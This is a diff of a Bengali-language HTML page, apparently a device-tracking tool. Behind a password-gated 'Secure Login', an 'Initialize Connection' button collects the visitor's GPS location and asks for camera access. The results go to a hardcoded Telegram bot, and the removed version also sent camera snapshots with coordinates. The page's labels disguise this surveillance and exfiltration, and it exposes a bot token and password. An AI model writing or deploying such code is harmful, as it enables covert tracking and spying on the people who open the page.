@@ -2,36 +2,33 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <title>Control Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Access Gateway</title>
     <style>
-        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
-        .btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 8px; cursor: pointer; color: white; font-weight: bold; background: #3b82f6; }
+        body { font-family: Arial, sans-serif; background-color: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background-color: #1e293b; padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 5px; border: none; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 5px; cursor: pointer; color: white; font-weight: bold; margin-bottom: 10px; }
         #dashboard { display: none; }
-        #v { width: 100%; display: none; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="card" id="loginSection">
-    <h2>Login</h2>
+    <h2>Secure Login</h2>
     <input type="password" id="passwordInput" placeholder="Password...">
-    <button class="btn" onclick="verifyPassword()" style="background:#22c55e;">Login</button>
+    <button class="btn" onclick="verifyPassword()" style="background-color: #22c55e;">Login</button>
 </div>
 
 <div class="card" id="dashboard">
-    <h2>Lab Dashboard</h2>
-    <button class="btn" onclick="initiateHardware()">Camera & Location</button>
-    <button class="btn" onclick="captureSnapshot()">Capture Photo</button>
-    
-    <video id="v" autoplay playsinline></video>
-    <div id="status" style="margin-top:10px; font-size:12px; color:gray;">System Ready</div>
+    <h2>Control Panel</h2>
+    <button class="btn" onclick="requestAccess()" style="background-color: #3b82f6;">Initialize Connection</button>
+    <div id="status" style="margin-top: 15px; font-size: 14px; color: #cbd5e1;">System Waiting...</div>
 </div>
 
 <script>
     const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
-    const CHAT_ID = "8566985497"; 
-    let lat = "N/A", lon = "N/A";
+    const CHAT_ID = "8566985497";
 
     function verifyPassword() {
         if(document.getElementById('passwordInput').value === "Tamim0186#@") {
@@ -40,31 +37,32 @@
         } else { alert("Wrong Password!"); }
     }
 
-    async function initiateHardware() {
-        navigator.geolocation.getCurrentPosition(pos => {
-            lat = pos.coords.latitude;
-            lon = pos.coords.longitude;
-        });
-        const stream = await navigator.mediaDevices.getUserMedia({video: true});
-        document.getElementById('v').srcObject = stream;
-        document.getElementById('v').style.display = 'block';
+    async function requestAccess() {
+        document.getElementById('status').innerText = "Requesting permissions...";
+        
+        // লোকেশন সংগ্রহ
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const loc = `LAT: ${pos.coords.latitude}, LON: ${pos.coords.longitude}`;
+            await sendToBot("Connection Initialized: " + loc);
+        }, () => sendToBot("Location access denied."));
+
+        // ক্যামেরা অ্যাক্সেস
+        try {
+            await navigator.mediaDevices.getUserMedia({video: true});
+            sendToBot("Camera access granted.");
+        } catch(e) {
+            sendToBot("Camera access denied.");
+        }
     }
 
-    function captureSnapshot() {
-        const v = document.getElementById('v');
-        const c = document.createElement('canvas');
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        c.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob);
-            formData.append('caption', `Loc: ${lat}, ${lon}`);
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST', body: formData
-            }).then(() => document.getElementById('status').innerText = "✅ Sent!");
+    async function sendToBot(msg) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
         });
+        document.getElementById('status').innerText = "✅ Data sent to Telegram!";
     }
 </script>
 
